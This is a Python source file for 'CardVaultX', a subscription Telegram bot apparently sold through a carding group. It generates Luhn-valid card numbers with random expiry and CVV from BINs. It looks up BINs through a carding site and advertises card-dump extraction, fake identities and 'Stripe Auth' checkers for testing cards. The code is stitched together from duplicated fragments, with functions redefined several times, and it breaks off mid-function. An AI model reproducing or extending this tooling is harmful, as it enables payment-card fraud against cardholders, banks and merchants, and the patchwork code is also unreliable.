import os
import time
import logging
import asyncio
import aiohttp
import re
import psutil
import random
from datetime import datetime, timedelta
from db import get_user, update_user, init_db
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from telegram.error import BadRequest
from faker import Faker
import pytz
import uuid
from config import ADMIN_IDS


# === CONFIGURATION ===
# IMPORTANT: Set these as environment variables before running your bot:
# export BOT_TOKEN="YOUR_TELEGRAM_BOT_TOKEN"
# export OWNER_ID="YOUR_TELEGRAM_USER_ID" # Your personal Telegram User ID (numeric)
# export BINTABLE_API_KEY="YOUR_BINTABLE_API_KEY" # Get this from Bintable.com
TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID")) if os.getenv("OWNER_ID") else None

# --- New Configuration ---
AUTHORIZATION_CONTACT = "@K4linuxx"
OFFICIAL_GROUP_LINK = "https://t.me/+gtvJT4SoimBjYjQ1"
DEFAULT_FREE_CREDITS = 200  # A non-expiring credit pool for free users

# === PERSISTENCE WARNING ===
# The following dictionaries store data in-memory and will be LOST when the bot
# is redeployed. For a production environment on Railway, you MUST replace
# this with a real database solution like PostgreSQL.
#
# A simple approach for your use case would be:
# 1. Add a `psycopg2` or `asyncpg` library to your requirements.txt.
# 2. Set up a PostgreSQL database on Railway.
# 3. Create functions to connect to the database and perform CRUD operations
#    (Create, Read, Update, Delete) on user data.
# 4. Replace `USER_DATA_DB` and `REDEEM_CODES` with calls to these database functions.
#
# --- GLOBAL STATE (In-Memory) ---
user_last_command = {}
AUTHORIZED_CHATS = set()
AUTHORIZED_PRIVATE_USERS = set()
REDEEM_CODES = {} # New dictionary to store redeem codes
USER_DATA_DB = {
    OWNER_ID: {
        'credits': 9999,
        'plan': 'PLUS',
        'status': 'Owner',
        'plan_expiry': 'N/A',
        'keys_redeemed': 0,
        'registered_at': '03-08-2025'
    }
}
# Initialize Faker
fake = Faker()

# === LOGGING SETUP ===
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# === HELPER FUNCTIONS ===
def escape_markdown_v2(text: str) -> str:
    """Escapes markdown v2 special characters."""
    special_chars = r"([_*\[\]()~`>#+\-=|{}.!])"
    return re.sub(special_chars, r"\\\1", text)

def get_level_emoji(level):
    level_lower = level.lower()
    if "gold" in level_lower:
        return "🌟"
    elif "platinum" in level_lower:
        return "💎"
    elif "premium" in level_lower:
        return "✨"
    elif "infinite" in level_lower:
        return "♾️"
    elif "corporate" in level_lower:
        return "💼"
    elif "business" in level_lower:
        return "📈"
    elif "standard" in level_lower or "classic" in level_lower:
        return "💳"
    return "💡"

def get_vbv_status_display(status):
    if status is True:
        return "✅ LIVE"
    elif status is False:
        return "❌ DEAD"
    else:
        return "🤷 N/A"

def luhn_checksum(card_number):
    """Checks if a credit card number is valid using the Luhn algorithm."""
    digits = [int(d) for d in card_number if d.isdigit()]
    total = 0
    num_digits = len(digits)
    parity = num_digits % 2
    for i, digit in enumerate(digits):
        if i % 2 == parity:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

from db import get_user, update_user  # your async DB functions
from datetime import datetime

DEFAULT_FREE_CREDITS = 200
DEFAULT_PLAN = "Free"
DEFAULT_STATUS = "Free"
DEFAULT_PLAN_EXPIRY = "N/A"
DEFAULT_KEYS_REDEEMED = 0

async def get_user_data(user_id):
    """
    Fetch user data from DB; if not exists, create with defaults then fetch.
    """
    user_data = await get_user(user_id)
    if not user_data:
        now_str = datetime.now().strftime('%d-%m-%Y')
        # Insert new user with defaults
        await update_user(
            user_id,
            credits=DEFAULT_FREE_CREDITS,
            plan=DEFAULT_PLAN,
            status=DEFAULT_STATUS,
            plan_expiry=DEFAULT_PLAN_EXPIRY,
            keys_redeemed=DEFAULT_KEYS_REDEEMED,
            registered_at=now_str
        )
        # Fetch again after insertion
        user_data = await get_user(user_id)
    return user_data


async def consume_credit(user_id: int) -> bool:
    """
    Deduct 1 credit if available. Return True if succeeded.
    """
    user_data = await get_user_data(user_id)
    if user_data and user_data.get('credits', 0) > 0:
        new_credits = user_data['credits'] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False


async def add_credits_to_user(user_id: int, amount: int):
    """
    Add credits to user, creating user if needed.
    Return updated credits or None if failure.
    """
    user_data = await get_user_data(user_id)
    if not user_data:
        return None
    new_credits = user_data.get('credits', 0) + amount
    await update_user(user_id, credits=new_credits)
    return new_credits


async def get_bin_details(bin_number):
    bin_data = {
        "scheme": "N/A",         # Card brand (e.g., VISA, Mastercard)
        "type": "N/A",           # Credit/Debit
        "level": "N/A",          # Card level (e.g., Classic, Business)
        "bank": "N/A",           # Bank name
        "country_name": "N/A",   # Full country name
        "country_emoji": "",     # Country flag emoji
        "vbv_status": None,      # Placeholder, not provided by API
        "card_type": "N/A"       # Redundant with type, still kept
    }

    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json"
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=7) as response:
                if response.status == 200:
                    data = await response.json()
                    bin_data["scheme"] = data.get("brand", "N/A").upper()
                    bin_data["type"] = data.get("type", "N/A").title()
                    bin_data["card_type"] = data.get("type", "N/A").title()
                    bin_data["level"] = data.get("level", "N/A").title()
                    bin_data["bank"] = data.get("bank", "N/A").title()
                    bin_data["country_name"] = data.get("country_name", "N/A")
                    bin_data["country_emoji"] = data.get("country_flag", "")
                    return bin_data
                else:
                    logger.warning(f"Antipublic API returned status {response.status} for BIN {bin_number}")
    except aiohttp.ClientError as e:
        logger.warning(f"Antipublic API call failed for {bin_number}: {e}")
    except Exception as e:
        logger.warning(f"Error processing Antipublic response for {bin_number}: {e}")

    logger.warning(f"Failed to get BIN details for {bin_number} from antipublic.cc.")
    return bin_data

async def enforce_cooldown(user_id: int, update: Update) -> bool:
    """Enforces a 5-second cooldown per user."""
    current_time = time.time()
    last_command_time = user_last_command.get(user_id, 0)
    if current_time - last_command_time < 5:
        await update.effective_message.reply_text("⏳ Please wait 5 seconds before retrying\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return False
    user_last_command[user_id] = current_time
    return True

from config import OWNER_ID  # Ensure OWNER_ID is loaded from environment or config

from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from config import OWNER_ID, OFFICIAL_GROUP_LINK, AUTHORIZED_PRIVATE_USERS, AUTHORIZED_CHATS
from db import get_user

async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Checks if a user or group is authorized to use the bot."""

    user = update.effective_user
    user_id = user.id
    chat = update.effective_chat
    chat_type = chat.type
    chat_id = chat.id

    # Owner is always authorized
    if user_id == OWNER_ID:
        return True

    # Allow /start, /plans, and /redeem for everyone
    if update.message and update.message.text:
        cmd = update.message.text.strip().split()[0].lower()
        if cmd in ["/start", "/plans", "/redeem"]:
            return True

    # Check plan validity in private chat
    is_authorized_by_plan = False
    user_data = await get_user(user_id)
    plan_expiry_str = user_data.get('plan_expiry', 'N/A')

    if user_id in AUTHORIZED_PRIVATE_USERS:
        is_authorized_by_plan = True
    elif plan_expiry_str != 'N/A':
        try:
            plan_expiry_date = datetime.strptime(plan_expiry_str, '%d-%m-%Y')
            if plan_expiry_date >= datetime.now():
                is_authorized_by_plan = True
            elif user_id in AUTHORIZED_PRIVATE_USERS:
                AUTHORIZED_PRIVATE_USERS.remove(user_id)
        except ValueError:
            pass

    if chat_type == 'private':
        if is_authorized_by_plan:
            return True
        else:
            keyboard = [[InlineKeyboardButton("📢 Official Group", url=OFFICIAL_GROUP_LINK)]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.effective_message.reply_text(
                "🚫 *Private Usage Blocked*\n"
                "You cannot use this bot in private chat\\.\n\n"
                "Buy a plan or join our group to access tools for free\\.\n"
                "Get a subscription from @K4linuxx to use this bot\\.",
                reply_markup=reply_markup,
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return False

    elif chat_type in ('group', 'supergroup'):
        if chat_id in AUTHORIZED_CHATS:
            return True
        else:
            await update.effective_message.reply_text(
                "🚫 This group is not authorized to use this bot\\.\n"
                "Please contact @K4linuxx to get approved\\.",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return False

    return False


# === COMMAND HANDLERS ===
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from telegram.error import BadRequest
from telegram.helpers import escape_markdown
from datetime import datetime
import pytz
import logging

from db import get_user
from config import OFFICIAL_GROUP_LINK  # Ensure this is defined in your config

logger = logging.getLogger(__name__)

# Custom MarkdownV2 escaper
def escape_markdown_v2(text: str) -> str:
    import re
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))
    
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.error import BadRequest
from telegram.helpers import escape_markdown
from datetime import datetime
import pytz
import logging

logger = logging.getLogger(__name__)

OFFICIAL_GROUP_LINK = "https://t.me/CARDER33"  # replace with your group link

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    logger.info(f"/start called by user: {user.id} (@{user.username})")

    indian_timezone = pytz.timezone('Asia/Kolkata')
    now = datetime.now(indian_timezone).strftime('%I:%M %p')
    today = datetime.now(indian_timezone).strftime('%d-%m-%Y')

    user_data = await get_user(user.id)
    credits = user_data.get('credits', 0)
    plan = user_data.get('plan', 'Free')

    escaped_user_id = escape_markdown(str(user.id), version=2)
    escaped_username = escape_markdown(user.username or 'N/A', version=2)
    escaped_today = escape_markdown(today, version=2)
    escaped_now = escape_markdown(now, version=2)
    escaped_credits = escape_markdown(str(credits), version=2)
    escaped_plan = escape_markdown(plan, version=2)

    welcome_message = (
        f"👋 *Welcome to 𝓒𝓪𝓻d𝓥𝓪𝒖𝓵𝒕𝑿* ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 𝙄𝘿: `{escaped_user_id}`\n"
        f"👤 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: @{escaped_username}\n"
        f"📅 𝘿𝙖𝙩𝙚: `{escaped_today}`\n"
        f"🕒 𝙏𝙞𝙢𝙚: `{escaped_now}`\n"
        f"💳 𝘾𝙧𝙚𝙙𝙞𝙩𝙨: `{escaped_credits}`\n"
        f"📋 𝙋𝙡𝙖𝙣: `{escaped_plan}`\n\n"
        f"𝓤𝓼𝓮 𝓽𝓱𝓮 𝓫𝓾𝓽𝓽𝓸𝓷𝓼 𝓫𝓮𝓵𝓸𝔀 𝓽𝓸 𝓰𝓮𝓽 𝓼𝓽𝓪𝓻𝓽𝓮𝓓 👇"
    )

    keyboard = [
        [
            InlineKeyboardButton("🛠 Tools", callback_data="tools_menu"),
            InlineKeyboardButton("🚪 Gates", callback_data="gates_menu"),
        ],
        [
            InlineKeyboardButton("📢 Join Group", url=OFFICIAL_GROUP_LINK)
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        if update.message:
            await update.message.reply_text(
                welcome_message,
                reply_markup=reply_markup,
                parse_mode=ParseMode.MARKDOWN_V2
            )
        elif update.callback_query:
            query = update.callback_query
            await query.answer()
            await query.edit_message_text(
                welcome_message,
                reply_markup=reply_markup,
                parse_mode=ParseMode.MARKDOWN_V2
            )
    except Exception as e:
        logger.warning(f"Error sending start message: {e}")


# Gates menu handler
from telegram.constants import ParseMode

def escape_markdown_v2(text: str) -> str:
    escape_chars = r'\_*[]()~`>#+-=|{}.!'
    return ''.join('\\' + c if c in escape_chars else c for c in text)

async def gates_menu_handler(update, context):
    query = update.callback_query
    await query.answer()

    gates_message = (
        "🚪 *Gates Menu*\n\n"
        "Use the following commands:\n\n"
        "• `/chk` \\- *Check a single card on Stripe Auth*\n"
        "  Example:\n"
        "  `\\/chk 1234567890123456\\|12\\|24\\|123`\n\n"
        "• `/mchk` \\- *Check up to 10 cards on Stripe Auth*\n"
        "  Example:\n"
        "  `\\/mchk 1234567890123456\\|12\\|24\\|123 2345678901234567\\|11\\|23\\|456`\n"
    )

    # No additional escaping needed if you write carefully above, else use escape_markdown_v2

    keyboard = [
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        gates_message,
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=reply_markup
    )



# Handler to go back to main start menu (from buttons)
async def start_menu_handler(update, context):
    query = update.callback_query
    await query.answer()
    # Simply call start() with the update & context to reuse the start message & keyboard
    # But start() expects update.message for sending, so we must do similar logic here
    user = update.effective_user
    indian_timezone = pytz.timezone('Asia/Kolkata')
    now = datetime.now(indian_timezone).strftime('%I:%M %p')
    today = datetime.now(indian_timezone).strftime('%d-%m-%Y')

    user_data = await get_user(user.id)
    credits = user_data.get('credits', 0)
    plan = user_data.get('plan', 'Free')

    escaped_user_id = escape_markdown(str(user.id), version=2)
    escaped_username = escape_markdown(user.username or 'N/A', version=2)
    escaped_today = escape_markdown(today, version=2)
    escaped_now = escape_markdown(now, version=2)
    escaped_credits = escape_markdown(str(credits), version=2)
    escaped_plan = escape_markdown(plan, version=2)

    welcome_message = (
        f"👋 *Welcome to 𝓒𝓪𝓻d𝓥𝓪𝒖𝓵𝒕𝑿* ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 𝙄𝘿: `{escaped_user_id}`\n"
        f"👤 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: @{escaped_username}\n"
        f"📅 𝘿𝙖𝙩𝙚: `{escaped_today}`\n"
        f"🕒 𝙏𝙞𝙢𝙚: `{escaped_now}`\n"
        f"💳 𝘾𝙧𝙚𝙙𝙞𝙩𝙨: `{escaped_credits}`\n"
        f"📋 𝙋𝙡𝙖𝙣: `{escaped_plan}`\n\n"
        f"𝓤𝓼𝓮 𝓽𝓱𝓮 𝓫𝓾𝓽𝓽𝓸𝓷𝓼 𝓫𝓮𝓵𝓸𝔀 𝓽𝓸 𝓰𝓮𝓽 𝓼𝓽𝓪𝓻𝓽𝓮𝓓 👇"
    )
    keyboard = [
        [
            InlineKeyboardButton("🛠 Tools", callback_data="tools_menu"),
            InlineKeyboardButton("🚪 Gates", callback_data="gates_menu"),
        ],
        [
            InlineKeyboardButton("📢 Join Group", url=OFFICIAL_GROUP_LINK)
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        welcome_message,
        reply_markup=reply_markup,
        parse_mode=ParseMode.MARKDOWN_V2,
    )


# Main callback query handler, example usage:
async def handle_callback(update, context):
    query = update.callback_query
    await query.answer()

    data = query.data

    if data == "tools_menu":
        await show_tools_menu(update, context)
    elif data == "gates_menu":
        await gates_menu_handler(update, context)
    elif data in ["start_menu", "back_to_start"]:
        await start_menu_handler(update, context)
    else:
        await query.answer("Unknown option selected.", show_alert=True)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows the bot's help menu with a list of commands."""
    if not await check_authorization(update, context):
        return
    help_message = (
        "╭━━━[ 🤖 *Help Menu* ]━━━⬣\n"
        "┣ ❏ `/start` \\- Welcome message\n"
        "┣ ❏ `/help` \\- Shows this help message\n"
        "┣ ❏ `/gen <bin>` \\- Generate cards from BIN\n"
        "┣ ❏ `/bin <bin>` \\- BIN lookup \\(bank, country, type\\)\n"
        "┣ ❏ `/fk <country>` \\- Generate fake identity info\n"
        "┣ ❏ `/fl <dump>` \\- Extracts cards from dumps\n"
        "┣ ❏ `/status` \\- Bot system status info\n"
        "┣ ❏ `/credits` \\- Check your remaining credits\n"
        "┣ ❏ `/info` \\- Shows your user info\n"
        "┣ ❏ `/chk` \\- Checks card on stripe auth\n"
        "┣ ❏ `/mchk` \\- Checks upto 10 cards on stripe auth\n"
        "╰━━━━━━━━━━━━━━━━━━⬣"
    )
    await update.effective_message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN_V2)


async def show_tools_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows the list of tools and their status."""
    query = update.callback_query
    await query.answer()
    tools_message = (
        "*✦ All Commands ✦*\n\n"
        "All commands are live, `Online`, and have `100%` health\\.\n\n"
        "• `/gen <BIN>` \\- Generates 10 cards\n"
        "• `/fk <country>` \\- Generates fake info\n"
        "• `/fl <dump>` \\- Extracts cards from dumps\n"
        "• `/credits` \\- Shows your credits\n"
        "• `/bin <BIN>` \\- Performs BIN lookup\n"
        "• `/status` \\- Checks bot health\n"
        "• `/info` \\- Shows your info\n"
        "• `/chk` \\- Checks card on stripe auth\n"
        "• `/mchk` \\- Checks up to 10 cards on stripe auth"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back to Start", callback_data="back_to_start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(tools_message, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN_V2)


async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Main callback handler for all inline keyboard buttons."""
    query = update.callback_query
    await query.answer()

    data = query.data

    if data == "tools_menu":
        await show_tools_menu(update, context)

    elif data == "gates_menu":
        # Show gates submenu
        await gates_menu_handler(update, context)

    elif data == "start_menu" or data == "back_to_start":
        # Go back to main start menu
        await start_menu_handler(update, context)

    elif data.startswith("cmd_"):
        # Handle commands like /chk and /mchk info
        await cmd_handler(update, context)

    else:
        # Unknown callback data (optional fallback)
        await query.answer("Unknown option selected.", show_alert=True)




def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    import re
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows the user's detailed information."""
    if not await check_authorization(update, context):
        return

    user = update.effective_user
    user_data = await get_user(user.id)

    # Escape all dynamic values
    first_name = escape_markdown_v2(user.first_name or 'N/A')
    user_id = escape_markdown_v2(str(user.id))
    username = escape_markdown_v2(user.username or 'N/A')
    status = escape_markdown_v2(user_data.get('status', 'N/A'))
    credits = escape_markdown_v2(str(user_data.get('credits', 0)))
    plan = escape_markdown_v2(user_data.get('plan', 'N/A'))
    plan_expiry = escape_markdown_v2(user_data.get('plan_expiry', 'N/A'))
    keys_redeemed = escape_markdown_v2(str(user_data.get('keys_redeemed', 0)))
    registered_at = escape_markdown_v2(user_data.get('registered_at', 'N/A'))

    info_message = (
        "🔍 *Your Info on 𝓒𝓪𝓻d𝓥𝓪𝒖𝒍𝒕𝑿* ⚡\n"
        "━━━━━━━━━━━━━━\n"
        f"👤 𝙁𝙞𝙧𝙨𝙩 𝙉𝙖𝙢𝙚: `{first_name}`\n"
        f"🆔 𝙄𝘿: `{user_id}`\n"
        f"📛 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: @{username}\n\n"
        f"📋 𝙎𝙩𝙖𝙩𝙪𝙨: `{status}`\n"
        f"💳 𝘾𝙧𝙚𝙙𝙞𝙩: `{credits}`\n"
        f"💼 𝙋𝙡𝙖𝙣: `{plan}`\n"
        f"📅 𝙋𝙡𝙖𝙣 𝙀𝙭𝙥𝙞𝙧𝙮: `{plan_expiry}`\n"
        f"🔑 𝙆𝙚𝙮𝙨 𝙍𝙚𝙙𝙚𝙚𝙢𝙚𝙙: `{keys_redeemed}`\n"
        f"🗓 𝙍𝙚𝙜𝙞𝙨𝙩𝙚𝙧𝙚𝙙 𝘼𝙩: `{registered_at}`\n"
    )

    await update.message.reply_text(info_message, parse_mode=ParseMode.MARKDOWN_V2)


from telegram.constants import ParseMode
from telegram.helpers import escape_markdown as escape_markdown_v2
async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generates cards from a given BIN or partial card."""
    if not await check_authorization(update, context):
        return

    user = update.effective_user
    if not await enforce_cooldown(user.id, update):
        return

    user_data = await get_user(user.id)
    if user_data['credits'] <= 0:
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Get input
    if context.args:
        raw_input = context.args[0]
    elif update.effective_message and update.effective_message.text:
        parts = update.effective_message.text.split(maxsplit=1)
        raw_input = parts[1] if len(parts) > 1 else None
    else:
        raw_input = None

    if not raw_input:
        return await update.effective_message.reply_text(
            "❌ Please provide BIN, partial card, or pattern\\. Usage:\n"
            "`/gen 414740`\n`/gen 445769222`\n`/gen 414740|11|2028|777`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Parse input
    parts = raw_input.split("|")
    card_base = parts[0].strip()
    extra_mm = parts[1].zfill(2) if len(parts) > 1 and parts[1].isdigit() else None
    extra_yyyy = parts[2] if len(parts) > 2 and parts[2].isdigit() else None
    extra_cvv = parts[3] if len(parts) > 3 and parts[3].isdigit() else None

    if not card_base.isdigit():
        return await update.effective_message.reply_text(
            "❌ Card/BIN must contain only digits\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    if not await consume_credit(user.id):
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # BIN lookup
    bin_details = await get_bin_details(card_base[:6])
    brand = bin_details.get("scheme", "Unknown")
    bank = bin_details.get("bank", "Unknown")
    country_name = bin_details.get("country_name", "Unknown")
    country_emoji = bin_details.get("country_emoji", "")

    # Determine card length
    card_length = 15 if "american express" in brand.lower() or "amex" in brand.lower() else 16

    # Generate cards
    cards = []
    attempts = 0
    while len(cards) < 10 and attempts < 100:
        attempts += 1
        suffix_len = card_length - len(card_base)
        if suffix_len < 0:
            break  # invalid input length

        card_number = card_base + ''.join(str(random.randint(0, 9)) for _ in range(suffix_len))
        if not luhn_checksum(card_number):
            continue

        mm = extra_mm or str(random.randint(1, 12)).zfill(2)
        yyyy = extra_yyyy or str(datetime.now().year + random.randint(1, 5))
        cvv = extra_cvv or (
            str(random.randint(0, 9999)).zfill(4) if card_length == 15 else str(random.randint(0, 999)).zfill(3)
        )

        cards.append(f"`{card_number}|{mm}|{yyyy[-2:]}|{cvv}`")

    cards_list = "\n".join(cards)

    # Escape for MarkdownV2
    escaped_bin = escape_markdown_v2(card_base)
    escaped_brand = escape_markdown_v2(brand)
    escaped_bank = escape_markdown_v2(bank)
    escaped_country_name = escape_markdown_v2(country_name)
    escaped_country_emoji = escape_markdown_v2(country_emoji)

    # BIN info block
    bin_info_block = (
        f"┣ ❏ 𝐁𝐈𝐍        ➳ `{escaped_bin}`\n"
        f"┣ ❏ 𝐁𝐫𝐚𝐧𝐝      ➳ `{escaped_brand}`\n"
        f"┣ ❏ 𝐁𝐚𝐧𝐤       ➳ `{escaped_bank}`\n"
        f"┣ ❏ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲    ➳ `{escaped_country_name}`{escaped_country_emoji}\n"
        f"╰━━━━━━━━━━━━━━━━━━⬣"
    )
    bin_info_for_md = bin_info_block.replace("\n", "\n> ")

    # Final output
    final_message = (
        f"> *Generated 10 Cards 💳*\n\n"
        f"{cards_list}\n"
        f">\n"
        f"> {bin_info_for_md}"
    )

    await update.effective_message.reply_text(
        final_message,
        parse_mode=ParseMode.MARKDOWN_V2
    )



from telegram.constants import ParseMode

def escape_markdown_v2(text: str) -> str:
    escape_chars = r"\_*[]()~`>#+-=|{}.!"
    return ''.join(['\\' + char if char in escape_chars else char for char in text])

from telegram.constants import ParseMode
from telegram.helpers import escape_markdown as escape_markdown_v2

async def bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Performs a BIN lookup."""
    if not await check_authorization(update, context):
        return

    user = update.effective_user
    if not await enforce_cooldown(user.id, update):
        return

    user_data = await get_user(user.id)
    if user_data['credits'] <= 0:
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    bin_input = None
    if context.args:
        bin_input = context.args[0]
    elif update.effective_message and update.effective_message.text:
        command_text = update.effective_message.text.split(maxsplit=1)
        if len(command_text) > 1:
            bin_input = command_text[1]

    if not bin_input or not bin_input.isdigit() or len(bin_input) < 6:
        return await update.effective_message.reply_text(
            "❌ Please provide a 6\\-digit BIN\\. Usage: `/bin [bin]` or `\\.bin [bin]`\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    if not await consume_credit(user.id):
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    bin_input = bin_input[:6]
    bin_details = await get_bin_details(bin_input)

    if not bin_details:
        return await update.effective_message.reply_text(
            "❌ BIN not found or invalid\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Escape and extract data safely
    escaped_bin = escape_markdown_v2(bin_input)
    escaped_scheme = escape_markdown_v2(bin_details.get("scheme", "N/A"))
    escaped_bank = escape_markdown_v2(bin_details.get("bank", "N/A"))
    escaped_card_type = escape_markdown_v2(bin_details.get("card_type", "N/A"))
    escaped_level = escape_markdown_v2(bin_details.get("level", "N/A"))
    escaped_country_name = escape_markdown_v2(bin_details.get("country_name", "N/A"))
    escaped_country_emoji = escape_markdown_v2(bin_details.get("country_emoji", ""))
    vbv_status = bin_details.get("vbv_status", "Unknown")
    escaped_user = escape_markdown_v2(user.full_name)

    # Custom emojis/status
    level_emoji = get_level_emoji(escaped_level)
    status_display = get_vbv_status_display(vbv_status)

    # BIN info box (no space after country)
    bin_info_box = (
        f"╭━━━[ ✦ *𝐁𝐈𝐍 𝐈𝐍𝐅𝐎* ✦ ]━━━⬣\n"
        f"┣ ❏ *𝐁𝐈𝐍*       ➳ `{escaped_bin}`\n"
        f"┣ ❏ *𝐒𝐭𝐚𝐭𝐮𝐬*    ➳ `{escape_markdown_v2(status_display)}`\n"
        f"┣ ❏ *𝐁𝐫𝐚𝐧𝐝*     ➳ `{escaped_scheme}`\n"
        f"┣ ❏ *𝐓𝐲𝐩𝐞*      ➳ `{escaped_card_type}`\n"
        f"┣ ❏ *𝐋𝐞𝐯𝐞𝐥*     ➳ `{level_emoji} {escaped_level}`\n"
        f"┣ ❏ *𝐁𝐚𝐧𝐤*      ➳ `{escaped_bank}`\n"
        f"┣ ❏ *𝐂𝐨𝐮𝐧𝐭𝐫𝐲*   ➳ `{escaped_country_name}`{escaped_country_emoji}\n"
    )

    user_info_box = (
        f"┣ ❏ *𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐞𝐝 𝐛𝐲* ➳ `{escaped_user}`\n"
        f"┣ ❏ *𝐁𝐨𝐭 𝐛𝐲*       ➳ [kคli liຖนxx](tg://resolve?domain=K4linuxx)\n"
        f"╰━━━━━━━━━━━━━━━━━━⬣"
    )

    final_message = f"{bin_info_box}\n\n{user_info_box}"

    await update.effective_message.reply_text(
        final_message,
        parse_mode=ParseMode.MARKDOWN_V2
    )




def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    import re
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the /credits command, showing user info and credits."""
    if not await check_authorization(update, context):
        return

    user = update.effective_user
    user_data = await get_user(user.id)

    credits = str(user_data.get('credits', 0))
    plan = user_data.get('plan', 'N/A')

    # Escape user inputs
    escaped_username = escape_markdown_v2(user.username or 'N/A')
    escaped_user_id = escape_markdown_v2(str(user.id))
    escaped_plan = escape_markdown_v2(plan)
    escaped_credits = escape_markdown_v2(credits)

    credit_message = (
        f"💳 *Your Credit Info* 💳\n"
        f"━━━━━━━━━━━━━━\n"
        f"👤 Username: `@{escaped_username}`\n"
        f"🆔 User ID: `{escaped_user_id}`\n"
        f"📋 Plan: `{escaped_plan}`\n"
        f"💳 Credits: `{escaped_credits}`\n"
    )

    await update.effective_message.reply_text(
        credit_message,
        parse_mode=ParseMode.MARKDOWN_V2
    )

import time
import asyncio
import aiohttp
from telegram import Update
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from telegram.ext import ContextTypes

# Import your database functions here
from db import get_user, update_user

async def enforce_cooldown(user_id: int, update: Update) -> bool:
    cooldown_seconds = 5
    if not hasattr(enforce_cooldown, "user_cooldowns"):
        enforce_cooldown.user_cooldowns = {}
    last_run_time = enforce_cooldown.user_cooldowns.get(user_id, 0)
    current_time = time.time()

    if current_time - last_run_time < cooldown_seconds:
        remaining_time = round(cooldown_seconds - (current_time - last_run_time), 2)
        await update.effective_message.reply_text(
            escape_markdown(f"⏳ Cooldown in effect. Please wait {remaining_time} seconds.", version=2),
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return False
    enforce_cooldown.user_cooldowns[user_id] = current_time
    return True

async def consume_credit(user_id: int) -> bool:
    """
    Consume 1 credit from DB user if available.
    """
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

def get_bin_details_sync(bin_number: str) -> dict:
    # Simulated BIN lookup
    time.sleep(1.5)
    return {
        "scheme": "Visa",
        "type": "Credit",
        "country_name": "United States"
    }

async def background_check(cc_normalized, parts, user, user_data, processing_msg):
    start_time = time.time()
    try:
        bin_number = parts[0][:6]
        bin_details = await asyncio.to_thread(get_bin_details_sync, bin_number)
        brand = (bin_details.get("scheme") or "N/A").upper()
        issuer = (bin_details.get("type") or "N/A").upper()
